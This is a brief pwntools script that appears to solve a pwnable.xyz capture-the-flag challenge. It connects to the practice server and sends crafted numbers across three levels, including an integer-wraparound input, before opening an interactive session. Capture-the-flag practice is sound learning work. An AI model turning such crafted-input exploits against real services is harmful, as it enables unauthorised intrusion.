from pwn import *

r = remote('svc.pwnable.xyz',30008)

###level1
r.sendlineafter('x: ',str(0))
r.sendlineafter('y: ',str(0x100000000-1337))

###level2
r.sendlineafter('=== t00leet ===\n',str(9*12289)+' '+str(38833))

###level3
r.sendlineafter('=== 3leet ===\n','-2 -1 0 1 2')

r.interactive()
